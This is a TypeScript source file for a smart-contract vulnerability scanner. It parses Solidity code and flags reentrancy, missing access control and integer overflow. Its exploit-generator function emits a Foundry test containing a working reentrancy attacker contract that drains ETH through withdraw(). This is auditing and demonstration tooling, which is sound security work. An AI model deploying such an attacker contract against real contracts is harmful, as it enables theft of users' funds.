import * as parser from '@solidity-parser/parser';
import {
  ParsedContract,
  ContractInfo,
  FunctionInfo,
  StateVariableInfo,
  ModifierInfo,
  ParameterInfo,
  Vulnerability,
  VulnerabilityType,
  AnalysisResult,
} from './types';

// ============= PARSER =============

export function parseSource(source: string): { ast: unknown; parsed: ParsedContract } {
  const ast = parser.parse(source, {
    loc: true,
    range: true,
    tolerant: true,
  });

  const parsed = extractContractInfo(ast);
  return { ast, parsed };
}

function extractContractInfo(ast: unknown): ParsedContract {
  const result: ParsedContract = {
    contracts: [],
    pragmaVersion: null,
    imports: [],
  };

  const astNode = ast as { children?: unknown[] };
  for (const node of astNode.children || []) {
    const n = node as { type: string; name?: string; value?: string; path?: string };
    if (n.type === 'PragmaDirective' && n.name === 'solidity') {
      result.pragmaVersion = n.value || null;
    }
    if (n.type === 'ImportDirective') {
      result.imports.push(n.path || '');
    }
    if (n.type === 'ContractDefinition') {
      result.contracts.push(extractContract(node));
    }
  }

  return result;
}

function extractContract(node: unknown): ContractInfo {
  const n = node as {
    name: string;
    kind: string;
    baseContracts?: { baseName: { namePath: string } }[];
    subNodes?: unknown[];
  };

  const contract: ContractInfo = {
    name: n.name,
    kind: n.kind,
    baseContracts: (n.baseContracts || []).map((bc) => bc.baseName.namePath),
    functions: [],
    stateVariables: [],
    modifiers: [],
  };

  for (const subNode of n.subNodes || []) {
    const sub = subNode as { type: string; variables?: unknown[] };
    if (sub.type === 'FunctionDefinition') {
      contract.functions.push(extractFunction(subNode));
    }
    if (sub.type === 'StateVariableDeclaration') {
      for (const variable of sub.variables || []) {
        contract.stateVariables.push(extractStateVariable(variable, subNode));
      }
    }
    if (sub.type === 'ModifierDefinition') {
      contract.modifiers.push(extractModifier(subNode));
    }
  }

  return contract;
}

function extractFunction(node: unknown): FunctionInfo {
  const n = node as {
    name?: string;
    isConstructor?: boolean;
    isFallback?: boolean;
    visibility?: string;
    stateMutability?: string;
    modifiers?: { name: string }[];
    parameters?: unknown[];
    body?: unknown;
    loc?: { start?: { line: number } };
  };

  return {
    name: n.name || (n.isConstructor ? 'constructor' : n.isFallback ? 'fallback' : 'receive'),
    visibility: n.visibility || 'public',
    stateMutability: n.stateMutability || 'nonpayable',
    modifiers: (n.modifiers || []).map((m) => m.name),
    parameters: (n.parameters || []).map(extractParameter),
    body: n.body,
    line: n.loc?.start?.line || 0,
  };
}

function extractParameter(node: unknown): ParameterInfo {
  const n = node as { name?: string; typeName?: unknown };
  return {
    name: n.name || '',
    typeName: getTypeName(n.typeName),
  };
}

function extractStateVariable(variable: unknown, declaration: unknown): StateVariableInfo {
  const v = variable as { name: string; typeName?: unknown; visibility?: string };
  const d = declaration as { loc?: { start?: { line: number } } };
  return {
    name: v.name,
    typeName: getTypeName(v.typeName),
    visibility: v.visibility || 'internal',
    line: d.loc?.start?.line || 0,
  };
}

function extractModifier(node: unknown): ModifierInfo {
  const n = node as {
    name: string;
    parameters?: unknown[];
    loc?: { start?: { line: number } };
  };
  return {
    name: n.name,
    parameters: (n.parameters || []).map(extractParameter),
    line: n.loc?.start?.line || 0,
  };
}

function getTypeName(typeNode: unknown): string {
  if (!typeNode) return 'unknown';
  const t = typeNode as {
    type: string;
    name?: string;
    namePath?: string;
    keyType?: unknown;
    valueType?: unknown;
    baseTypeName?: unknown;
  };

  if (t.type === 'ElementaryTypeName') return t.name || 'unknown';
  if (t.type === 'UserDefinedTypeName') return t.namePath || 'unknown';
  if (t.type === 'Mapping') {
    return `mapping(${getTypeName(t.keyType)} => ${getTypeName(t.valueType)})`;
  }
  if (t.type === 'ArrayTypeName') {
    return `${getTypeName(t.baseTypeName)}[]`;
  }
  return 'unknown';
}

// ============= VULNERABILITY DETECTOR =============

let vulnerabilityCounter = 0;

function generateId(type: VulnerabilityType): string {
  vulnerabilityCounter++;
  return `${type.toUpperCase()}-${vulnerabilityCounter.toString().padStart(3, '0')}`;
}

export function detectVulnerabilities(parsed: ParsedContract): Vulnerability[] {
  const vulnerabilities: Vulnerability[] = [];
  vulnerabilityCounter = 0;

  for (const contract of parsed.contracts) {
    if (contract.kind === 'interface' || contract.kind === 'library') continue;

    vulnerabilities.push(...detectReentrancy(contract));
    vulnerabilities.push(...detectAccessControl(contract));
    vulnerabilities.push(...detectIntegerOverflow(contract, parsed.pragmaVersion));
  }

  return vulnerabilities;
}

interface ExternalCallInfo {
  type: string;
  line: number;
}

interface StateChangeInfo {
  variableName: string;
  line: number;
}

function findExternalCalls(body: unknown): ExternalCallInfo[] {
  const calls: ExternalCallInfo[] = [];

  function traverse(node: unknown, parentLine?: number) {
    if (!node) return;
    const n = node as {
      type?: string;
      expression?: unknown;
      loc?: { start?: { line: number } };
    };

    const currentLine = n.loc?.start?.line || parentLine;

    if (n.type === 'FunctionCall') {
      let expr = n.expression as { type?: string; expression?: unknown; memberName?: string };
      if (expr?.type === 'NameValueExpression') {
        expr = (expr as { expression?: unknown }).expression as typeof expr;
      }
      if (expr?.type === 'MemberAccess') {
        const memberName = expr.memberName;
        if (['call', 'send', 'transfer', 'delegatecall', 'staticcall'].includes(memberName || '')) {
          calls.push({ type: memberName || '', line: currentLine || 0 });
        }
      }
    }

    for (const key in n) {
      const val = (n as Record<string, unknown>)[key];
      if (val && typeof val === 'object') {
        if (Array.isArray(val)) {
          for (const child of val) traverse(child, currentLine);
        } else {
          traverse(val, currentLine);
        }
      }
    }
  }

  traverse(body);
  return calls;
}

function findStateChanges(body: unknown): StateChangeInfo[] {
  const changes: StateChangeInfo[] = [];

  function getVariableName(node: unknown): string {
    const n = node as { type?: string; name?: string; base?: unknown; expression?: unknown; memberName?: string };
    if (n.type === 'Identifier') return n.name || 'unknown';
    if (n.type === 'IndexAccess') return getVariableName(n.base);
    if (n.type === 'MemberAccess') return `${getVariableName(n.expression)}.${n.memberName}`;
    return 'unknown';
  }

  function traverse(node: unknown, parentLine?: number) {
    if (!node) return;
    const n = node as {
      type?: string;
      expression?: unknown;
      operator?: string;
      left?: unknown;
      loc?: { start?: { line: number } };
    };

    const currentLine = n.loc?.start?.line || parentLine;

    if (n.type === 'ExpressionStatement') {
      const expr = n.expression as { type?: string; operator?: string; left?: unknown };
      if (expr?.type === 'BinaryOperation' && ['=', '+=', '-=', '*=', '/='].includes(expr.operator || '')) {
        const left = expr.left as { type?: string };
        if (left?.type === 'Identifier' || left?.type === 'IndexAccess') {
          changes.push({ variableName: getVariableName(left), line: currentLine || 0 });
        }
      }
    }

    if (n.type === 'BinaryOperation' && ['=', '+=', '-=', '*=', '/='].includes(n.operator || '')) {
      const left = n.left as { type?: string };
      if (left?.type === 'Identifier' || left?.type === 'IndexAccess') {
        changes.push({ variableName: getVariableName(left), line: currentLine || 0 });
      }
    }

    for (const key in n) {
      const val = (n as Record<string, unknown>)[key];
      if (val && typeof val === 'object') {
        if (Array.isArray(val)) {
          for (const child of val) traverse(child, currentLine);
        } else {
          traverse(val, currentLine);
        }
      }
    }
  }

  traverse(body);
  return changes;
}

function detectReentrancy(contract: ContractInfo): Vulnerability[] {
  const vulnerabilities: Vulnerability[] = [];

  for (const func of contract.functions) {
    if (!func.body) continue;
    if (func.stateMutability === 'view' || func.stateMutability === 'pure') continue;

    const externalCalls = findExternalCalls(func.body);
    const stateChanges = findStateChanges(func.body);

    for (const call of externalCalls) {
      if (!['call', 'send', 'delegatecall'].includes(call.type)) continue;

      const stateChangesAfterCall = stateChanges.filter((sc) => sc.line > call.line);

      if (stateChangesAfterCall.length > 0) {
        vulnerabilities.push({
          id: generateId('reentrancy'),
          type: 'reentrancy',
          severity: 'CRITICAL',
          title: `Reentrancy vulnerability in ${func.name}()`,
          description: `External ${call.type}() at line ${call.line} occurs before state variable update at line ${stateChangesAfterCall[0].line}. An attacker can recursively call ${func.name}() before the state is updated.`,
          location: {
            line: call.line,
            column: 0,
            functionName: func.name,
            contractName: contract.name,
          },
          attackVector: `External call (${call.type}) before state update (${stateChangesAfterCall[0].variableName})`,
          recommendation:
            'Apply the Checks-Effects-Interactions pattern: update state variables before making external calls. Consider using ReentrancyGuard from OpenZeppelin.',
          exploitable: true,
        });
      }
    }
  }

  return vulnerabilities;
}

function containsMsgSender(node: unknown): boolean {
  if (!node) return false;
  const n = node as { type?: string; expression?: unknown; memberName?: string; name?: string };

  if (
    n.type === 'MemberAccess' &&
    (n.expression as { type?: string; name?: string })?.type === 'Identifier' &&
    (n.expression as { name?: string })?.name === 'msg' &&
    n.memberName === 'sender'
  ) {
    return true;
  }

  for (const key in n) {
    const val = (n as Record<string, unknown>)[key];
    if (val && typeof val === 'object') {
      if (Array.isArray(val)) {
        for (const child of val) {
          if (containsMsgSender(child)) return true;
        }
      } else {
        if (containsMsgSender(val)) return true;
      }
    }
  }

  return false;
}

function checkForMsgSenderRequire(body: unknown): boolean {
  if (!body) return false;
  let found = false;

  function traverse(node: unknown) {
    if (!node || found) return;
    const n = node as { type?: string; expression?: unknown; arguments?: unknown[] };

    if (n.type === 'FunctionCall') {
      const expr = n.expression as { type?: string; name?: string };
      if (expr?.type === 'Identifier' && expr.name === 'require') {
        for (const arg of n.arguments || []) {
          if (containsMsgSender(arg)) {
            found = true;
            return;
          }
        }
      }
    }

    for (const key in n) {
      const val = (n as Record<string, unknown>)[key];
      if (val && typeof val === 'object') {
        if (Array.isArray(val)) {
          for (const child of val) traverse(child);
        } else {
          traverse(val);
        }
      }
    }
  }

  traverse(body);
  return found;
}

function detectAccessControl(contract: ContractInfo): Vulnerability[] {
  const vulnerabilities: Vulnerability[] = [];

  const sensitivePatterns = [
    'mint', 'burn', 'pause', 'unpause', 'setOwner', 'changeOwner', 'updateOwner',
    'setAdmin', 'upgrade', 'destroy', 'selfdestruct', 'kill', 'setPrice', 'setFee',
    'transferOwnership', 'renounceOwnership',
  ];

  const accessControlModifiers = [
    'onlyOwner', 'onlyAdmin', 'onlyRole', 'onlyAuthorized', 'restricted', 'auth', 'authorized', 'requiresAuth',
  ];

  for (const func of contract.functions) {
    if (func.visibility === 'private' || func.visibility === 'internal') continue;
    if (['constructor', 'fallback', 'receive'].includes(func.name)) continue;

    const isSensitive = sensitivePatterns.some((p) => func.name.toLowerCase().includes(p.toLowerCase()));
    if (!isSensitive) continue;

    const hasAccessControl = func.modifiers.some((mod) =>
      accessControlModifiers.some((ac) => mod.toLowerCase().includes(ac.toLowerCase()))
    );
    const hasRequireSender = checkForMsgSenderRequire(func.body);

    if (!hasAccessControl && !hasRequireSender) {
      vulnerabilities.push({
        id: generateId('access-control'),
        type: 'access-control',
        severity: 'HIGH',
        title: `Missing access control in ${func.name}()`,
        description: `The function ${func.name}() appears to be a sensitive function but lacks access control modifiers.`,
        location: {
          line: func.line,
          column: 0,
          functionName: func.name,
          contractName: contract.name,
        },
        attackVector: `Any address can call ${func.name}() without authorization`,
        recommendation: 'Add an appropriate access control modifier (e.g., onlyOwner) to restrict who can call this function.',
        exploitable: true,
      });
    }
  }

  return vulnerabilities;
}

function extractVersion(pragma: string): { major: number; minor: number } | null {
  const match = pragma.match(/(\d+)\.(\d+)/);
  if (match) {
    return { major: parseInt(match[1], 10), minor: parseInt(match[2], 10) };
  }
  return null;
}

function detectIntegerOverflow(contract: ContractInfo, pragmaVersion: string | null): Vulnerability[] {
  const vulnerabilities: Vulnerability[] = [];

  if (pragmaVersion) {
    const version = extractVersion(pragmaVersion);
    if (version && version.minor >= 8) {
      return []; // Solidity 0.8+ has built-in overflow checks
    }
  }

  for (const func of contract.functions) {
    if (!func.body) continue;

    const ops = findArithmeticOperations(func.body);
    for (const op of ops) {
      vulnerabilities.push({
        id: generateId(op.type === '+' || op.type === '*' ? 'integer-overflow' : 'integer-underflow'),
        type: op.type === '+' || op.type === '*' ? 'integer-overflow' : 'integer-underflow',
        severity: 'HIGH',
        title: `Potential integer ${op.type === '+' || op.type === '*' ? 'overflow' : 'underflow'} in ${func.name}()`,
        description: `Arithmetic operation (${op.type}) at line ${op.line} may ${op.type === '+' || op.type === '*' ? 'overflow' : 'underflow'} in Solidity < 0.8.0.`,
        location: {
          line: op.line,
          column: 0,
          functionName: func.name,
          contractName: contract.name,
        },
        attackVector: `Supply values that cause the operation to ${op.type === '+' || op.type === '*' ? 'overflow' : 'underflow'}`,
        recommendation: 'Use SafeMath library or upgrade to Solidity 0.8.0+ which has built-in overflow checks.',
        exploitable: true,
      });
    }
  }

  return vulnerabilities;
}

function findArithmeticOperations(body: unknown): { type: string; line: number }[] {
  const ops: { type: string; line: number }[] = [];

  function traverse(node: unknown, parentLine?: number) {
    if (!node) return;
    const n = node as { type?: string; operator?: string; loc?: { start?: { line: number } } };
    const currentLine = n.loc?.start?.line || parentLine;

    if (n.type === 'BinaryOperation' && ['+', '-', '*', '**'].includes(n.operator || '')) {
      ops.push({ type: n.operator || '', line: currentLine || 0 });
    }

    for (const key in n) {
      const val = (n as Record<string, unknown>)[key];
      if (val && typeof val === 'object') {
        if (Array.isArray(val)) {
          for (const child of val) traverse(child, currentLine);
        } else {
          traverse(val, currentLine);
        }
      }
    }
  }

  traverse(body);
  return ops;
}

// ============= EXPLOIT GENERATOR =============

export function generateExploitCode(vulnerabilities: Vulnerability[], contractName: string): string | null {
  const reentrancyVuln = vulnerabilities.find((v) => v.type === 'reentrancy' && v.location.functionName === 'withdraw');

  if (!reentrancyVuln) return null;

  return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * @title Reentrancy Exploit Test
 * @notice Demonstrates reentrancy vulnerability in ${contractName}.withdraw()
 * @dev Generated by Smart Contract Attack Simulator
 */
contract ReentrancyExploitTest is Test {
    ${contractName} public target;
    AttackerContract public attacker;

    function setUp() public {
        target = new ${contractName}();
        attacker = new AttackerContract(payable(address(target)));

        // Fund victim
        vm.deal(address(0x1), 10 ether);
        vm.prank(address(0x1));
        target.deposit{value: 1 ether}();

        // Fund attacker
        vm.deal(address(this), 10 ether);
    }

    function testReentrancyExploit() public {
        uint256 balanceBefore = address(target).balance;

        attacker.attack{value: 1 ether}();

        uint256 balanceAfter = address(target).balance;

        // Verify funds were drained
        assertLt(balanceAfter, balanceBefore, "Attack should drain funds");
        console.log("ETH drained:", balanceBefore - balanceAfter);
    }
}

contract AttackerContract {
    ${contractName} public target;
    uint256 public attackCount;

    constructor(address payable _target) {
        target = ${contractName}(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (attackCount < 5 && address(target).balance >= msg.value) {
            attackCount++;
            target.withdraw();
        }
    }
}`;
}

// ============= MAIN ANALYZE FUNCTION =============

export function analyzeContract(source: string): AnalysisResult {
  const { parsed } = parseSource(source);
  const vulnerabilities = detectVulnerabilities(parsed);

  const primaryContract = parsed.contracts[parsed.contracts.length - 1];
  const contractName = primaryContract?.name || 'Unknown';

  const exploitCode = generateExploitCode(vulnerabilities, contractName);

  return {
    contractName,
    solcVersion: parsed.pragmaVersion,
    vulnerabilities,
    exploitCode,
    summary: {
      critical: vulnerabilities.filter((v) => v.severity === 'CRITICAL').length,
      high: vulnerabilities.filter((v) => v.severity === 'HIGH').length,
      medium: vulnerabilities.filter((v) => v.severity === 'MEDIUM').length,
      low: vulnerabilities.filter((v) => v.severity === 'LOW').length,
      total: vulnerabilities.length,
    },
  };
}
